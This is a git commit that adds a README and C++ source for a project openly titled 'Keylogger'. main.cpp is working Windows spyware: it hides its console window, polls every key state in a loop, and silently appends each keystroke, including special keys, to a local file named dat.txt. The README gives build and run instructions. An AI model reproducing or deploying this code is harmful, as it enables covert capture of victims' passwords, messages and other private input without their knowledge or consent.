6f6dc0ffa1fb513d15d6b9d2fa49d2c6a796c173
daarkfight00 <ciuraciro7@gmail.com>
2023-11-19 18:35:57 +0100

    FIrst upload

---
+++ README.md
@@ -0,0 +1,61 @@
+
+# Keylogger
+
+This is a simple keylogger made it with C++
+
+If you dont know what is a keylogger, check this link for more info https://it.wikipedia.org/wiki/Keylogger
+
+
+## Installation for kali linux
+
+
+Clone repository
+```bash
+  git clone https://github.com/daarkfight00/Keylogger.git
+```
+Navigate to the project directory
+```bash
+  cd Keylogger
+```
+
+Update system
+```bash
+  sudo apt update && sudo apt upgrade
+```
+
+Install GNU C++ (g++)
+```bash
+  sudo apt install g++
+```
+
+Check g++ version
+```bash
+  g++ --version
+```
+
+Convert file to executable
+```bash
+  g++ main.cpp -o main
+```
+
+Run the file
+```bash
+  ./main
+```
+## Authors
+
+- [@daarkfight00](https://github.com/daarkfight00)
+
+
+## Support
+
+For support, open an Issues or check my discord server: https://discord.gg/cZxBaJ32yk
+
+
+[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
+[![GPLv3 License](https://img.shields.io/badge/License-GPL%20v3-yellow.svg)](https://opensource.org/licenses/)
+[![AGPL License](https://img.shields.io/badge/license-AGPL-blue.svg)](http://www.gnu.org/licenses/agpl-3.0)
+![GitHub followers](https://img.shields.io/github/followers/daarkfight00)
+![GitHub User's stars](https://img.shields.io/github/stars/daarkfight00)
+![X (formerly Twitter) URL](https://img.shields.io/twitter/url?url=https%3A%2F%2Ftwitter.com%2Fdaark_fighter)
+
---
+++ main.cpp
@@ -0,0 +1,113 @@
+#define _WIN32_WINNT 0x0500
+#include <Windows.h>
+#include <string>
+#include <stdlib.h>
+#include <stdio.h>
+#include <iostream>
+#include <fstream>
+
+using namespace std;
+
+
+
+void LOG(string input) {
+	fstream LogFile;
+	LogFile.open("dat.txt", fstream::app);
+	if (LogFile.is_open()) {
+		LogFile << input;
+		LogFile.close();
+	}
+}
+
+
+bool SpecialKeys(int S_Key) {
+	switch (S_Key) {
+	case VK_SPACE:
+		cout << " ";
+		LOG(" ");
+		return true;
+	case VK_RETURN:
+		cout << "\n";
+		LOG("\n");
+		return true;
+	case '¾':
+		cout << ".";
+		LOG(".");
+		return true;
+	case VK_SHIFT:
+		cout << "#SHIFT#";
+		LOG("#SHIFT#");
+		return true;
+	case VK_BACK:
+		cout << "\b";
+		LOG("\b");
+		return true;
+	case VK_RBUTTON:
+		cout << "#R_CLICK#";
+		LOG("#R_CLICK#");
+		return true;
+	case VK_CAPITAL:
+		cout << "#CAPS_LOCK#";
+		LOG("#CAPS_LCOK");
+		return true;
+	case VK_TAB:
+		cout << "#TAB";
+		LOG("#TAB");
+		return true;
+	case VK_UP:
+		cout << "#UP";
+		LOG("#UP_ARROW_KEY");
+		return true;
+	case VK_DOWN:
+		cout << "#DOWN";
+		LOG("#DOWN_ARROW_KEY");
+		return true;
+	case VK_LEFT:
+		cout << "#LEFT";
+		LOG("#LEFT_ARROW_KEY");
+		return true;
+	case VK_RIGHT:
+		cout << "#RIGHT";
+		LOG("#RIGHT_ARROW_KEY");
+		return true;
+	case VK_CONTROL:
+		cout << "#CONTROL";
+		LOG("#CONTROL");
+		return true;
+	case VK_MENU:
+		cout << "#ALT";
+		LOG("#ALT");
+		return true;
+	default: 
+		return false;
+	}
+}
+
+
+
+int main()
+{
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	char KEY = 'x';
+
+	while (true) {
+		Sleep(10);
+		for (int KEY = 8; KEY <= 190; KEY++)
+		{
+			if (GetAsyncKeyState(KEY) == -32767) {
+				if (SpecialKeys(KEY) == false) {
+
+					fstream LogFile;
+					LogFile.open("dat.txt", fstream::app);
+					if (LogFile.is_open()) {
+						LogFile << char(KEY);
+						LogFile.close();
+					}
+
+				}
+			}
+		}
+	}
+
+	return 0;
+}
